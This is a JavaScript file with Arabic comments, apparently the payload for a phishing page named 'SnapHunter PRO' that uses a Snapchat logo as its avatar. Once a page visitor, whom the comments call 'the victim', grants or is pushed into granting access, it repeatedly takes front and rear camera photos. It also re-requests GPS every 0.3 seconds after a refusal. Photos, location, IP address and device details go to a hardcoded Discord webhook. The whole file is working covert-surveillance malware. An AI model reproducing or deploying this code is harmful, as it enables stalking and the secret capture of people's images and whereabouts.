'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;
let isRunning = false;

/**
 * 1. إرسال البيانات فوراً لديسكورد
 * يتم ضغط الصور وتقليل الجودة لضمان الوصول في أجزاء من الثانية
 */
async function sendToDiscord(blob, text) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'shot.jpg');
    formData.append('payload_json', JSON.stringify({ 
        content: text, 
        username: "SnapHunter PRO",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));
    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

/**
 * 2. طلب الموقع الجغرافي بشكل إجباري (Aggressive GPS)
 * إذا رفض الضحية، يظهر الطلب مرة أخرى فوراً (كل 0.3 ثانية)
 */
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            sendToDiscord(null, `📍 **موقع الصيد المباشر:**\nhttp://maps.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { 
            // إلحاح في طلب الموقع عند الرفض
            setTimeout(forceLocation, 300); 
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

/**
 * 3. التقاط الصور من الكاميرا (أمامية وخلفية)
 * انتظار 300ms فقط للعدسة لضمان السرعة القصوى
 */
async function capturePhoto(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        
        // وقت استجابة سريع جداً للعدسة لفتح الصورة
        await new Promise(r => setTimeout(r, 400));

        const ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        // تحويل لـ JPEG بضغط 30% ليكون حجم الملف صغير جداً
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3));
        
        // إغلاق الكاميرا فوراً للسماح للعدسة الأخرى بالعمل
        stream.getTracks().forEach(t => t.stop());

        await sendToDiscord(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
    } catch (e) { }
}

/**
 * 4. المحرك الهجومي الرئيسي
 * يعمل تلقائياً + يعتمد على اللمس في حال حظر المتصفح
 */
async function startAttack() {
    if (isRunning) return;
    
    try {
        // محاولة طلب الكاميرا "هجومياً" فور الدخول
        const initialStream = await navigator.mediaDevices.getUserMedia({ video: true });
        initialStream.getTracks().forEach(t => t.stop());
        
        isRunning = true;
        forceLocation();

        // حلقة تكرار كل ثانيتين (2000ms)
        const runCycle = async () => {
            await capturePhoto('user');        // أمامية
            await capturePhoto('environment'); // خلفية
            setTimeout(runCycle, 2000); 
        };
        runCycle();
        
    } catch (err) {
        // في حال حظر المتصفح (سفاري)، ننتظر أي حركة من الضحية
        console.log("Waiting for user interaction...");
    }
}

// أ- التشغيل التلقائي فوراً (للكروم والمتصفحات السهلة)
startAttack();

// ب- في حال فشل (أ)، يتم التشغيل عند أول لمسة (للسفاري والآيفون)
['click', 'touchstart', 'scroll', 'mousedown'].forEach(event => {
    window.addEventListener(event, startAttack, { once: true });
});

// ج- تنبيه دخول فوري مع جلب الـ IP
(async () => {
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        sendToDiscord(null, `🚨 **صيد دخل الموقع الآن!**\n🌐 IP: \`${ipData.ip}\` \n📱 الجهاز: \`${navigator.userAgent}\``);
    } catch(e) {}
})();
